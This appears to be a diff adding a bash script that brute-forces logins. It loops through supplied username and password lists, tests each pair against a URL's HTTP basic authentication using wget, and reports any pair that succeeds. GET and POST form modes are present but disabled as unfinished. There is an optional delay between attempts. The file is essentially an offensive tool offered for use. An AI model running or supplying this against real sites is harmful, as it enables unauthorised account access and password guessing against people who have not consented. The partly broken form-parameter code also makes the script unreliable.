@@ -1,0 +1,104 @@
+#!/bin/bash
+
+req 'wget'
+
+usage="Usage:\t<url> <usernames> <passwords> [ -c <connection-protocol> ] [ -d <delay> ] [ -p(ost) <name> <pass> ] [ -g(et) <name> <pass> ]"
+url=
+usernames=
+passwords=
+delay=0
+post_or_get_args=
+attack_type="http"
+protocol="http"
+
+if [ -n "$3" ]; then
+	url="$1"
+	usernames="$2"
+	passwords="$3"
+else
+	echo -e "$usage"
+	exit
+fi
+
+shift 3
+
+while getopts "c:d:p:g:" opt; do
+	case $opt in
+		c)
+			protocol=$OPTARG
+			;;
+		d)
+			delay=$OPTARG
+			;;
+		p)
+			post_or_get_args+="$OPTARG"
+			attack_type="post"
+			;;
+		g)
+			post_or_get_args+="$OPTARG"
+			attack_type="get"
+			;;
+		\?)
+			echo "Invalid option: -$OPTARG"
+			;;
+	esac
+done
+
+if [[ $attack_type == "post" || $attack_type == "get" ]]; then
+	post_or_get_username=$post_or_get_args[0]
+	post_or_get_password=$post_or_get_args[1]
+fi
+
+echo "starting $attack_type-Attack on $protocol://$url"
+
+case $attack_type in
+	http)
+		for username in $usernames
+		do
+			for password in $passwords
+			do
+				if wget --spider $protocol://$username:$password@$url &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				sleep "$delay"
+			done
+		done
+		;;
+	get)
+		echo "Get doesnt work yet. "
+		exit
+		for username in $usernames
+		do
+			for password in $passwords
+			do
+				if wget $protocol://$url?$post_or_get_username=$username&$post_or_get_password=$password &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				sleep "$delay"
+			done
+		done
+		;;
+	post)
+		echo "Post doesnt work yet. "
+		exit
+		for username in $usernames
+		do
+			for password in $passwords
+			do
+				if wget --spider --post-data "$post_or_get_username=$username&$post_or_get_password=$password" $protocol://$url &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				sleep "$delay"
+			done
+		done
+		;;
+	\?)
+		echo "invalid attack type: $attack_type"
+		exit
+		;;
+esac
+
+echo "didnt work."
